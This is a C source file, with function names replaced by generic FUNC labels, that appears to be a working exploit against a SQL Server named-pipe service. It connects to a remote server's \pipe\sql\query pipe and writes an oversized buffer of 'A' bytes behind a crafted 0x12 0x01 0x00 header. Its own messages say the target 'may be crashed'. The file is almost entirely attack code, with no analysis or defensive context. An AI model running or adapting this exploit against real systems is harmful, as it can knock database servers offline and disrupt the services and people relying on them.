#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  scalar_t__ HANDLE ;
typedef  int /*<<< orphan*/  DWORD ;
typedef  scalar_t__ BOOL ;

/* Variables and functions */
 scalar_t__ FUNC0 (char*,int,int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int GENERIC_READ ; 
 int GENERIC_WRITE ; 
 int FUNC1 () ; 
 scalar_t__ INVALID_HANDLE_VALUE ; 
 int /*<<< orphan*/  OPEN_EXISTING ; 
 int /*<<< orphan*/  PIPE_READMODE_MESSAGE ; 
 scalar_t__ FUNC2 (scalar_t__,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC3 () ; 
 scalar_t__ FUNC4 (scalar_t__,char*,unsigned long,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 unsigned long FUNC5 (char*) ; 
 scalar_t__ FUNC6 (unsigned long) ; 
 int /*<<< orphan*/  FUNC7 (char*,char,unsigned long) ; 
 int /*<<< orphan*/  FUNC8 (char*,...) ; 
 int /*<<< orphan*/  FUNC9 (char*,char*,char*) ; 
 int FUNC10 (char*) ; 

int FUNC11(int argc, char* argv[])
{
	char lpPipeName[50];
	char *lpBuffer = NULL;
	unsigned long ulSize = 0;

	BOOL bResult;
	DWORD dwWritten = 0, dwMode;
	HANDLE hPipe;

	FUNC3();

	FUNC8("Starting...\n");

	if (argc != 3)
		goto Exit0;

	if (FUNC10(argv[1]) < 20)
	{
		FUNC9(lpPipeName, "\\\\%s\\\\.\\pipe\\sql\\query", argv[1]);
	}
	else
	{
		FUNC8("Error!server\n");
		goto Exit0;
	}

	ulSize= FUNC5(argv[2]);

	lpBuffer = (char*)FUNC6(ulSize + 2);
	if (NULL == lpBuffer)
	{
		FUNC8("malloc error!\n");
		goto Exit0;
	}

	FUNC7(lpBuffer, 0, ulSize + 2);
	FUNC7(lpBuffer, 'A', ulSize);
	*lpBuffer = '\x12';
	*(lpBuffer + 1) = '\x01';
	*(lpBuffer + 2) = '\x00';

	FUNC8("Connecting Server...\n");

	hPipe = FUNC0(lpPipeName,
					GENERIC_READ | GENERIC_WRITE,
					0,
					NULL,
					OPEN_EXISTING,
					0,
					NULL);
	if (INVALID_HANDLE_VALUE == hPipe)
	{
		FUNC8("Error!Connect server!%d\n", FUNC1());
		goto Exit0;
	}

	dwMode = PIPE_READMODE_MESSAGE;
	bResult = FUNC2(
		hPipe,	 // pipe handle
		&dwMode,  // new pipe mode
		NULL,	  // don't set maximum bytes
		NULL);	 // don't set maximum time
	if (!bResult)
	{
		FUNC8("Error!SetNamedPipeHandleState.%d\n", FUNC1());
		goto Exit0;
	}

	bResult = FUNC4(hPipe, lpBuffer, ulSize + 1, &dwWritten, NULL);

	if (!bResult)
	{
		FUNC8("\n\tError!WriteFile.%d\n\n", FUNC1());
		FUNC8("When see the error message, the target may be crashed!!\n\n");
		goto Exit0;
	}

Exit0:

	return 0;
}